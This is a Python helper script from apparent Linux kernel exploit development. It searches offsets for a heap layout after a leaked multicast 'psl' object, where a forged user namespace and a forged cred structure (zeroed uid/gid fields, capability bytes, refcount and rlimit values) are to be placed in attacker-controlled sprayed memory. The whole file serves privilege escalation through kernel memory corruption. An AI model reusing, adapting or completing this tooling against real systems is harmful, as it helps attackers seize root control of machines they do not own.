# Constraint search for the mcast post-leak layout.
# O = victim psl object (0x100), writable [0x18,0xf8) via its sources.
# F = uniform pattern written to every other group's psl.
#   cred at F offset v; fake ns starts in O at offset u and spills into F.
W_LO, W_HI = 0x18, 0xf8
LONG_MAX = 0x7fffffffffffffff

# ns fields: (offset, size, kind, value)
# kind: 'eq' exact value, 'nz' nonzero safe refcount, 'free' any
NS = [
    (0x00, 4, 'eq', 1),      # uid_map nr_extents
    (0x08, 4, 'eq', 0),      # extent[0].first
    (0x0c, 4, 'eq', 0),      # lower_first
    (0x10, 4, 'eq', 1),      # count
    (0x48, 4, 'eq', 1),      # gid_map nr_extents
    (0x50, 4, 'eq', 0),
    (0x54, 4, 'eq', 0),
    (0x58, 4, 'eq', 1),
    (0xd8, 8, 'eq', 0),      # parent
    (0xe0, 4, 'free', 0),    # level
    (0xe8, 4, 'free', 0),    # owner
    (0xec, 4, 'free', 0),    # group
    (0xf0, 8, 'free', 0),    # stashed
    (0xf8, 8, 'eq0', 0),     # ops (want NULL)
    (0x100, 4, 'free', 0),   # inum
    (0x104, 4, 'nz', 0x40000000),  # refcount
    (0x108, 4, 'zero', 0),   # flags
    (0x210, 8, 'eq', 0),     # ucounts terminator
    (0x268, 8, 'ge', LONG_MAX),    # rlimit_max[0]
]

def cred_req(v, V, x):
    """Return (kind,value) required of F byte-range starting at x by the cred at v."""
    i = x - v
    if i < 0 or i >= 0xb0:
        return None
    # exact layout (device BTF)
    if i < 0x08:
        return ('cred_self', 0)
    if i < 0x20:
        return ('zero', 0)
    if i < 0x24:   # fsgid
        return ('zero', 0)
    if i < 0x28:   # securebits
        return ('free', 0)
    if i < 0x50:   # caps
        return ('free', 0)
    if i < 0x78:   # keyrings + unknown
        return ('zero', 0)
    if i < 0xa0:   # pointers
        return ('ptr', i)
    return ('free', 0)  # rcu

def ns_place(u, M):
    """Place ns fields; M[x] = list of (kind,value) requirements at F offset x."""
    ok = True
    for (k, sz, kind, val) in NS:
        a = u + k
        if a < 0x100:
            if a < W_LO or a + sz > W_HI:
                # could still be fine if value is don't-care and unmapped header/tail
                if kind in ('free', 'zero', 'eq0') and val == 0:
                    continue
                return False, 'ns O field %#x unwritable' % k
            # direct write
        else:
            so = a & 0xff
            if so < W_LO or so + sz > W_HI:
                if kind in ('free', 'zero', 'eq0') and val == 0:
                    continue
                return False, 'ns F field %#x at slot off %#x unwritable' % (k, so)
            for j in range(sz):
                M.setdefault(so + j, []).append((kind, val, 'ns%#x' % k))
    return True, ''

def compat(reqs):
    kinds = set(r[0] for r in reqs)
    vals = set()
    for r in reqs:
        if r[0] in ('eq', 'eq0', 'ptr', 'cred_self'):
            vals.add(r[1] if r[0] != 'ptr' else ('ptr', r[1]))
    if len(vals) > 1:
        return False
    if 'eq' in kinds and 'zero' in kinds:
        return False
    if 'zero' in kinds and ('eq' in kinds or 'cred_self' in kinds):
        return False
    if 'eq' in kinds and 'cred_self' in kinds:
        return False
    # nz / ge / free coexist with anything that yields a compatible value
    if 'nz' in kinds and 'zero' in kinds:
        return False
    if 'nz' in kinds and 'eq' in kinds:
        v = [r[1] for r in reqs if r[0] == 'eq'][0]
        if not (1 <= v <= 0x7fffffff):
            return False
    if 'ge' in kinds and 'zero' in kinds:
        return False
    if 'ge' in kinds and 'eq' in kinds:
        v = [r[1] for r in reqs if r[0] == 'eq'][0]
        if v != LONG_MAX:
            return False
    return True

good = []
for u in range(0x18, 0xf1, 8):
    for v in range(0x18, 0x49, 8):
        M = {}
        for x in range(v, v + 0xb0):
            r = cred_req(v, None, x)
            if r:
                M.setdefault(x, []).append((r[0], r[1], 'cred'))
        ok, why = ns_place(u, M)
        if not ok:
            continue
        bad = False
        for x, rs in M.items():
            if x < W_LO or x >= W_HI:
                bad = True; break
            if not compat(rs):
                bad = True; break
        if bad:
            continue
        # Q/W/GI/SEC must fit in O outside the ns's direct O bytes
        occ = [0] * 0x100
        for (k, sz, kind, val) in NS:
            a = u + k
            if a < 0x100 and a >= W_LO and a + sz <= W_HI:
                for j in range(sz):
                    occ[a + j] = 1
        def find(sz, align):
            for base in range(W_LO, W_HI - sz + 1):
                if base % align: continue
                if not any(occ[base:base+sz]):
                    return base
            return None
        q = find(0x78, 8)   # ucounts needs span 0x78; its used bytes are +0x10..0x20,+0x70..0x78
        # Q's used bytes only (hlist unused, ucount[] zero ok): +0x10..0x20 and +0x70..0x78
        qok = None
        for base in range(0x08, 0x100 - 0x78 + 1):
            if base % 8: continue
            used = list(range(base+0x10, base+0x20)) + list(range(base+0x70, base+0x78))
            if used[0] < W_LO or used[-1] >= W_HI: continue
            if not any(occ[x] for x in used): qok = base; break
        if qok is None:
            continue
        # place SEC(0x18), W(8), GI(8) in O outside occ and Q-used and each other
        occ2 = occ[:]
        for x in list(range(qok+0x10, qok+0x20)) + list(range(qok+0x70, qok+0x78)):
            occ2[x] = 1
        pos = {}
        okall = True
        for name, sz, al in (('sec', 0x18, 4), ('user', 8, 8), ('gi', 8, 8)):
            f = None
            for base in range(W_LO, W_HI - sz + 1):
                if base % al: continue
                if not any(occ2[base:base+sz]): f = base; break
            if f is None: okall = False; break
            for j in range(sz): occ2[f+j] = 1
            pos[name] = f
        if not okall:
            continue
        good.append((u, v, qok, pos))
print("feasible:", len(good))
for g in good[:40]:
    print("u=%#x v=%#x q=%#x %s" % g)
